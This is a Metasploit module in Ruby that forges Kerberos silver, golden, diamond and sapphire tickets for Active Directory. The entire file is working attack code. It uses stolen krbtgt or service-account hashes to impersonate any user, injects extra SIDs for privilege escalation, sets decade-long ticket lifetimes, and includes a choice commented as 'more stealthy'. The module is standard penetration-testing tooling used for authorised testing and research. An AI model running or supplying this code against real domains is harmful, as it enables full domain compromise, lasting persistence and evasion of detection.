##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::Kerberos::Ticket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Silver/Golden/Diamond/Sapphire Ticket Forging',
        'Description' => %q{
          This module forges a Kerberos ticket. Four different techniques can be used:
          - Silver ticket: Using a service account hash, craft a ticket impersonating any user and privileges to that account.
          - Golden ticket: Using the krbtgt hash, craft a ticket impersonating any user and privileges.
          - Diamond ticket: Authenticate to the domain controller, and using the krbtgt hash, copy the PAC from the authenticated user to a forged ticket.
          - Sapphire ticket: Use the S4U2Self+U2U trick to retrieve the PAC of another user, then use the krbtgt hash to craft a forged ticket.
        },
        'Author' => [
          'Benjamin Delpy', # Original Implementation
          'Dean Welch', # Metasploit Module
          'alanfoster', # Enhancements
          'smashery' # Enhancements
        ],
        'References' => [
          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'AKA' => ['Ticketer', 'Klist']
        },
        'Actions' => [
          ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
          ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
          ['FORGE_DIAMOND', { 'Description' => 'Forge a Diamond Ticket' } ],
          ['FORGE_SAPPHIRE', { 'Description' => 'Forge a Sapphire Ticket' } ],
        ],
        'DefaultAction' => 'FORGE_SILVER'
      )
    )

    based_on_real_ticket_condition = ['ACTION', 'in', %w[FORGE_DIAMOND FORGE_SAPPHIRE]]
    forged_manually_condition = ['ACTION', 'in', %w[FORGE_SILVER FORGE_GOLDEN]]

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User to forge the ticket for' ]),
        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier (RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID], conditions: ['ACTION', 'in', %w[FORGE_SILVER FORGE_GOLDEN FORGE_DIAMOND]]),
        OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
        OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('DOMAIN_SID', [ false, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962'], conditions: forged_manually_condition),
        OptString.new('EXTRA_SIDS', [ false, 'Extra sids separated by commas, Ex: S-1-5-21-1755879683-3641577184-3486455962-519']),
        OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], conditions: %w[ACTION == FORGE_SILVER]),
        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650], conditions: forged_manually_condition),
        OptString.new('REQUEST_USER', [false, 'The user to request a ticket for, to base the forged ticket on'], conditions: based_on_real_ticket_condition),
        OptString.new('REQUEST_PASSWORD', [false, "The user's password, used to retrieve a base ticket"], conditions: based_on_real_ticket_condition),
        OptAddress.new('RHOSTS', [false, 'The address of the KDC' ], conditions: based_on_real_ticket_condition),
        OptInt.new('RPORT', [false, "The KDC server's port", 88 ], conditions: based_on_real_ticket_condition),
        OptInt.new('Timeout', [false, 'The TCP timeout to establish Kerberos connection and read data', 10], conditions: based_on_real_ticket_condition),
      ]
    )

    register_advanced_options(
      [
        OptString.new('SessionKey', [ false, 'The session key, if not set - one will be generated' ], conditions: forged_manually_condition),
        OptBool.new('IncludeTicketChecksum', [ false, 'Adds the Ticket Checksum to the PAC', false], conditions: forged_manually_condition)
      ]
    )
  end

  SECS_IN_DAY = 60 * 60 * 24

  def run
    case action.name
    when 'FORGE_SILVER'
      forge_silver
    when 'FORGE_GOLDEN'
      forge_golden
    when 'FORGE_DIAMOND'
      forge_diamond
    when 'FORGE_SAPPHIRE'
      forge_sapphire
    else
      fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
    end
  end

  private

  def forge_ccache(sname:, flags:, is_golden:)
    enc_key, enc_type = get_enc_key_and_type

    start_time = Time.now.utc
    end_time = start_time + SECS_IN_DAY * datastore['DURATION']

    ccache = forge_ticket(
      enc_key: enc_key,
      enc_type: enc_type,
      start_time: start_time,
      end_time: end_time,
      sname: sname,
      flags: flags,
      domain: datastore['DOMAIN'],
      username: datastore['USER'],
      user_id: datastore['USER_RID'],
      domain_sid: datastore['DOMAIN_SID'],
      extra_sids: extra_sids,
      session_key: datastore['SessionKey'].blank? ? nil : datastore['SessionKey'].strip,
      ticket_checksum: datastore['IncludeTicketChecksum'],
      is_golden: is_golden
    )

    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self)

    if datastore['VERBOSE']
      print_ccache_contents(ccache, key: enc_key)
    end
  end

  def forge_silver
    validate_spn!
    validate_sid!
    validate_key!
    sname = datastore['SPN'].split('/', 2)
    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(tgs_flags)
    forge_ccache(sname: sname, flags: flags, is_golden: false)
  end

  def forge_golden
    validate_sid!
    validate_key!
    sname = ['krbtgt', datastore['DOMAIN'].upcase]
    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(tgt_flags)
    forge_ccache(sname: sname, flags: flags, is_golden: true)
  end

  def forge_diamond
    validate_remote
    validate_aes256_key!

    begin
      domain = datastore['DOMAIN']
      options = {
        server_name: "krbtgt/#{domain}",
        client_name: datastore['REQUEST_USER'],
        password: datastore['REQUEST_PASSWORD'],
        realm: domain
      }
      enc_key, enc_type = get_enc_key_and_type
      include_crypto_params(options, enc_key, enc_type)

      tgt_result = send_request_tgt(**options)
    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Requesting TGT failed: #{e.message}")
    rescue Rex::HostUnreachable => e
      fail_with(Msf::Exploit::Failure::Unreachable, "Requesting TGT failed: #{e.message}")
    end

    if tgt_result.krb_enc_key[:enctype] != enc_type
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Response has incorrect encryption type (#{tgt_result.krb_enc_key[:enctype]})")
    end

    begin
      ticket = modify_ticket(tgt_result.as_rep.ticket, tgt_result.decrypted_part, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, enc_key, enc_type, enc_key, false)
    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError
      fail_with(Msf::Exploit::Failure::BadConfig, 'Failed to modify ticket. krbtgt key is likely incorrect')
    end
    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])

    if datastore['VERBOSE']
      print_ccache_contents(ticket, key: enc_key)
    end
  end

  def forge_sapphire
    validate_remote
    validate_key!
    options = {}
    enc_key, enc_type = get_enc_key_and_type
    include_crypto_params(options, enc_key, enc_type)

    begin
      auth_context = kerberos_authenticator.authenticate_via_kdc(options)
    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Error authenticating to KDC: #{e}")
    rescue Rex::HostUnreachable => e
      fail_with(Msf::Exploit::Failure::Unreachable, "Requesting TGT failed: #{e.message}")
    end
    credential = auth_context[:credential]

    print_status("#{peer} - Using U2U to impersonate #{datastore['USER']}@#{datastore['DOMAIN']}")

    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
      type: credential.keyblock.enctype.value,
      value: credential.keyblock.data.value
    )

    begin
      tgs_ticket, tgs_auth = kerberos_authenticator.u2uself(credential, impersonate: datastore['USER'])
    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Error executing S4U2Self+U2U: #{e}")
    rescue Rex::HostUnreachable => e
      fail_with(Msf::Exploit::Failure::Unreachable, "Error executing S4U2Self+U2U: #{e.message}")
    end
    # Don't pass a user RID in: we'll retrieve it from the decrypted PAC
    ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], nil, datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)
    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])

    if datastore['VERBOSE']
      print_ccache_contents(ticket, key: enc_key)
    end
  end

  def validate_remote
    if datastore['RHOSTS'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'Must specify RHOSTS for sapphire and diamond tickets')
    elsif datastore['REQUEST_USER'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'Must specify REQUEST_USER for sapphire and diamond tickets')
    end
  end

  def kerberos_authenticator
    options = {
      host: datastore['RHOST'],
      realm: datastore['DOMAIN'],
      timeout: datastore['TIMEOUT'],
      username: datastore['REQUEST_USER'],
      password: datastore['REQUEST_PASSWORD'],
      framework: framework,
      framework_module: self,
      ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::None.new
    }

    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
  end

  def include_crypto_params(options, enc_key, enc_type)
    options[:key] = enc_key
    if enc_type == Rex::Proto::Kerberos::Crypto::Encryption::AES256
      # This should be the server's preferred encryption type, so we can just
      # send our default types, expecting that to be selected. More stealthy this way.
      options[:offered_etypes] = Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes
    else
      options[:offered_etypes] = [enc_type]
    end
  end

  def get_enc_key_and_type
    enc_type = nil
    key = nil
    if datastore['NTHASH']
      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
      key = datastore['NTHASH']
    elsif datastore['AES_KEY']
      key = datastore['AES_KEY']
      if datastore['AES_KEY'].size == 64
        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256
      else
        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128
      end
    end

    enc_key = key.nil? ? nil : [key].pack('H*')
    [enc_key, enc_type]
  end

  def validate_spn!
    unless datastore['SPN'] =~ %r{.*/.*}
      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid SPN, must be in the format <service class>/<host><realm>:<port>/<service name>. Ex: cifs/host.realm.local')
    end
  end

  def validate_sid!
    unless datastore['DOMAIN_SID'] =~ /^S-1-[0-59]-\d{2}/
      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid DOMAIN_SID. Ex: S-1-5-21-1266190811-2419310613-1856291569')
    end
  end

  def validate_aes256_key!
    unless datastore['NTHASH'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets (NTHASH is currently set)')
    end

    if datastore['AES_KEY'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets')
    end

    if datastore['AES_KEY'].size == 32
      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets (currently set to an AES128 key)')
    end

    if datastore['AES_KEY'].size != 64
      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets (incorrect length)')
    end
  end

  def validate_key!
    if datastore['NTHASH'].blank? && datastore['AES_KEY'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH or AES_KEY must be set for forging a ticket')
    elsif datastore['NTHASH'].present? && datastore['AES_KEY'].present?
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH and AES_KEY may not both be set for forging a ticket')
    end

    if datastore['NTHASH'].present? && datastore['NTHASH'].size != 32
      fail_with(Msf::Exploit::Failure::BadConfig, "NTHASH length was #{datastore['NTHASH'].size} should be 32")
    end

    if datastore['AES_KEY'].present? && datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64
      fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
    end

    if datastore['NTHASH'].present?
      print_warning('Warning: newer Windows systems may not accept tickets encrypted with RC4_HMAC (NT hash). Consider using AES.')
    end
  end

  def extra_sids
    (datastore['EXTRA_SIDS'] || '').split(',').map(&:strip).reject(&:blank?)
  end
end
